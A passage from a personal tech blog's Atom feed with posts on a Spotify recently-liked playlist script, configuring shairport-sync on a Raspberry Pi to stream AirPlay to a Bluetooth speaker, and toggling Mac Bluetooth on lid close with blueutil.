&amp;lt;p&amp;gt;&amp;lt;strong&amp;gt;You can distinguish the debug versions from the real stable versions by the process names -&amp;lt;&amp;#x2F;strong&amp;gt; WebKit process names that end &amp;lt;code&amp;gt;.Development&amp;lt;&amp;#x2F;code&amp;gt; are the debug versions.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;submitting-the-fix&amp;quot;&amp;gt;Submitting the Fix&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;If you found and fixed the bug, follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;webkit.org&amp;#x2F;contributing-code&amp;#x2F;&amp;quot;&amp;gt;WebKit’s guide for submitting a patch&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Good luck!&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Spotify Smart Playlists</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-01-spotify-smart-playlists&#x2F;"/>
                <updated>2025-01-01T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2025-01-01-spotify-smart-playlists&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;Happy New Year! I&amp;#x27;m excited to share some projects I&amp;#x27;ve been working on over the past few years, starting with Spotify Smart Playlists - Recently Liked Songs:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-problem&amp;quot;&amp;gt;The Problem&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;As a music lover and long-time Spotify user (since 2015!), I&amp;#x27;ve collected over 3,500 liked songs. However, my 128GB iPhone couldn&amp;#x27;t download them all for offline listening. I had to manually create smaller playlists for situations like flights or camping trips without service.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-inspiration&amp;quot;&amp;gt;The Inspiration&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I remembered the &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;support.apple.com&amp;#x2F;en-mo&amp;#x2F;guide&amp;#x2F;itunes&amp;#x2F;itns3001&amp;#x2F;windows&amp;quot;&amp;gt;Smart Playlists feature from iTunes&amp;lt;&amp;#x2F;a&amp;gt;, which allowed for dynamic playlist creation based on user-defined criteria. Searching for a similar solution in Spotify, I stumbled upon &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;smarterplaylists.playlistmachinery.com&amp;#x2F;&amp;quot;&amp;gt;Smarter Playlists&amp;lt;&amp;#x2F;a&amp;gt;. Unfortunately, I couldn&amp;#x27;t get periodic runs to work and was very hesitant to share my Spotify tokens over HTTP (a security concern, especially in 2025).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-solution&amp;quot;&amp;gt;The Solution&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I decided to create my own Python-based solution, leveraging an always-on Linux laptop at home. You can find the code and setup instructions on GitHub: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;spotify-recent-songs&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;spotify-recent-songs&amp;lt;&amp;#x2F;a&amp;gt;. This code automatically maintains a playlist with my 1,500 most recently liked songs.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-outcome&amp;quot;&amp;gt;The Outcome&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;With this playlist, I could keep my recently liked songs downloaded without consuming too much space. Although I&amp;#x27;ve since upgraded to a new phone with more storage - I hope it helps others facing similar challenges.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Bathroom Smart Speaker Part 2 - AirPlay to Bluetooth Speaker via Raspberry Pi</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi&#x2F;"/>
                <updated>2022-03-02T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2022-03-02-bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;In &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;lewin.co.il&amp;#x2F;bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant&amp;#x2F;&amp;quot;&amp;gt;part 1&amp;lt;&amp;#x2F;a&amp;gt; I wrote on how to create a smart speaker supporting Spotify Connect using a Raspberry Pi and a Bluetooth speaker. Since writing that post I started using Apple Music and wanted to enjoy simultaneous streaming of music to multiple speakers in my house. I wanted my bathroom speaker, which became smart by supporting Spotify Connect, to also be able to play Apple Music.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Apple Music casting uses &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.apple.com&amp;#x2F;airplay&amp;#x2F;&amp;quot;&amp;gt;AirPlay&amp;lt;&amp;#x2F;a&amp;gt; for casting audio between devices. It can be used to cast any sound from Apple devices, even when using Spotify, watching YouTube or having a phone call.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;In order to add this capability to your smart speaker from the previous post - we’re going to use &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mikebrady&amp;#x2F;shairport-sync&amp;quot;&amp;gt;shairport-sync&amp;lt;&amp;#x2F;a&amp;gt;, which is an open-source audio player supporting AirPlay 1 (and AirPlay 2 partially, at the time of writing this post). The instructions in this post are partially based on &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mikebrady&amp;#x2F;shairport-sync&amp;#x2F;issues&amp;#x2F;200#issuecomment-520574102&amp;quot;&amp;gt;this GitHub comment by &amp;lt;code&amp;gt;bedrin&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;steps&amp;quot;&amp;gt;Steps&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;h3 id=&amp;quot;installing-shairport-sync&amp;quot;&amp;gt;Installing shairport-sync&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Execute the following commands from to install the most recent version of shairport-sync:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo apt-get update
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo apt-get install build-essential git xmltoman autoconf automake libtool libpopt-dev libconfig-dev libasound2-dev avahi-daemon libavahi-client-dev libssl-dev libsoxr-dev
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;mikebrady&amp;#x2F;shairport-sync.git
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; shairport-sync
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;autoreconf -fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;.&amp;#x2F;configure --sysconfdir&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;&amp;#x2F;etc --with-alsa --with-soxr --with-avahi --with-ssl&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;openssl --with-systemd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo make install
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;giving-shairport-sync-bluetooth-permissions&amp;quot;&amp;gt;Giving shairport-sync Bluetooth Permissions&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;shairport-sync needs permissions to play sound over Bluetooth. Run these commands to add shairport-sync’s user (and &amp;lt;code&amp;gt;pi&amp;lt;&amp;#x2F;code&amp;gt; for testing purposes) to the Bluetooth UNIX group which will permit it to play audio:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo adduser pi bluetooth
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo adduser shairport-sync bluetooth
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;adding-additional-alsa-device&amp;quot;&amp;gt;Adding Additional ALSA Device&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;In the previous post we edited &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; to point to the Bluetooth speaker as the default device. shairport-sync requires a named device, so we’ll create another ALSA device alongside the default one to also map to the Bluetooth speaker.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Open &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; and copy the MAC address you filled after &amp;lt;code&amp;gt;defaults.bluealsa.device&amp;lt;&amp;#x2F;code&amp;gt; (should be at line 4 in quotation marks). Replace the content of &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; with the following, while replacing &amp;lt;code&amp;gt;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; with the MAC address you found in line 4:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;pcm.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ctl.!default &amp;amp;quot;bluealsa&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.interface &amp;amp;quot;hci0&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.device &amp;amp;quot;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;defaults.bluealsa.profile &amp;amp;quot;a2dp&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;pcm.bathroom_bt {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; type plug
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  slave {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    pcm {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      type bluealsa
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      device &amp;amp;quot;&amp;amp;lt;UE Boom Bluetooth MAC&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;      profile &amp;amp;quot;a2dp&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  hint {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    show on
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    description &amp;amp;quot;Bathroom BT&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;In the above configuration I named this device &amp;quot;bathroom_bt&amp;quot; (line 7) with the description &amp;quot;Bathroom BT&amp;quot;. You can replace this to fit your scenario, but make sure to replace it in the below shairport-sync configuration as well.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;shairport-sync-configuration&amp;quot;&amp;gt;shairport-sync Configuration&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Now that the ALSA device is configured - we should configure shairport-sync to use this device as the sound output device. Replace the content of &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;shairport-sync.conf&amp;lt;&amp;#x2F;code&amp;gt; with the following:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;general =
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	name = &amp;amp;quot;Bathroom Speaker&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;};
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;sessioncontrol =
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	allow_session_interruption = &amp;amp;quot;yes&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;};
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;alsa =
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	output_device = &amp;amp;quot;bathroom_bt&amp;amp;quot;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;};
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The &amp;lt;code&amp;gt;name&amp;lt;&amp;#x2F;code&amp;gt; parameter under &amp;lt;code&amp;gt;general&amp;lt;&amp;#x2F;code&amp;gt; (line 3) will be the displayed AirPlay name, set it to a suitable value. If you changed the name of the ALSA device (in &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;asound.conf&amp;lt;&amp;#x2F;code&amp;gt; at line 7) change it under &amp;lt;code&amp;gt;output_device&amp;lt;&amp;#x2F;code&amp;gt; at line 13 as well.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;disable-wifi-power-management&amp;quot;&amp;gt;Disable WiFi Power Management&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Raspberry Pi’s WiFi can sometimes goes into power-saving mode, which can cause audio drops and glitches when acting as an AirPlay server. We can disable the WiFi power management by editing &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;rc.local&amp;lt;&amp;#x2F;code&amp;gt; and adding the following line right before &amp;lt;code&amp;gt;exit 0&amp;lt;&amp;#x2F;code&amp;gt; (if you followed my previous post - this should be at line 19):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;iwconfig wlan0 power off
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After adding this line, your &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;rc.local&amp;lt;&amp;#x2F;code&amp;gt; should look like this:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;sh -e
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# rc.local
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# This script is executed at the end of each multiuser runlevel.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Make sure that the script will &amp;amp;quot;exit 0&amp;amp;quot; on success or any other
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# value on error.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# In order to enable or disable this script just change the execution
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# bits.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# By default this script does nothing.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Print the IP address
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_IP&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;$(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hostname -I&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;true
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;[ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;$&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_IP&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;]&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;then
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;printf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;My IP address is %s\n&amp;amp;quot; &amp;amp;quot;$&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;_IP&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;fi
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;iwconfig wlan0 power off
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;exit&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; 0
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;h3 id=&amp;quot;enable-shairport-sync-service&amp;quot;&amp;gt;Enable shairport-sync Service&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Finalize your setup by enabling the &amp;lt;code&amp;gt;shairport-sync&amp;lt;&amp;#x2F;code&amp;gt; service and performing a system reboot to load all the new configurations:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo systemctl enable shairport-sync
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo reboot
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>QuietComfort 35 + MacBook + iPhone Bluetooth Connectivity</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-14-quietcomfort-35-macbook-iphone-bluetooth-connectivity&#x2F;"/>
                <updated>2019-03-14T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2019-03-14-quietcomfort-35-macbook-iphone-bluetooth-connectivity&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;I received QuietComfort 35 from work, and I loved it from the first moment I used it. It’s always connected to my work Mac, my personal Mac and to my iPhone.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;But whenever I leave work &amp;#x2F; home and close my laptop lid - I would expect the seamless reaction for the headphones to switch automatically to my iPhone audio while disconnecting from my now-sleeping Mac.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The current behaviour is far from that. My Mac stays connected even with it’s lid shut in my backpack, and I have to manually open the Bose app on my phone and switch the Mac connection off.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;I was looking for a solution to turn off Bluetooth when lid is shut - but sadly the only one I could find is &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.controlplaneapp.com&amp;#x2F;&amp;quot;&amp;gt;ControlPlane&amp;lt;&amp;#x2F;a&amp;gt;, which apparently used to be an app that lets you perform actions on Mac system events (such as lid closed &amp;#x2F; opened). Sadly I gave it a try and it seems broken on newer Macs.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Today I found this amazing app - &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.dssw.co.uk&amp;#x2F;powermanager&amp;#x2F;&amp;quot;&amp;gt;Power Manager&amp;lt;&amp;#x2F;a&amp;gt;. With this app, along with a small Bluetooth command line utility, my problem was solved easily.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;You can download my Power Manager profile &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.dropbox.com&amp;#x2F;s&amp;#x2F;ax60yhy0anhn0qi&amp;#x2F;BluetoothSchedule.pm-schedule&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;, please note it requires the installation of &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;toy&amp;#x2F;blueutil&amp;quot;&amp;gt;blueutil&amp;lt;&amp;#x2F;a&amp;gt;, available via Homebrew. The profile basically runs &amp;lt;code&amp;gt;blueutil -p 0&amp;lt;&amp;#x2F;code&amp;gt; before sleep (lid close), and &amp;lt;code&amp;gt;blueutil -p 1&amp;lt;&amp;#x2F;code&amp;gt; on wake (lid open).&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>TorrentLeechSeeder and DLink DSL-6740U File Upload</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2018-02-17-torrentleechseeder-and-dlink-dsl-6740u-file-upload&#x2F;"/>
                <updated>2018-02-17T00:00:00+0000</updated>
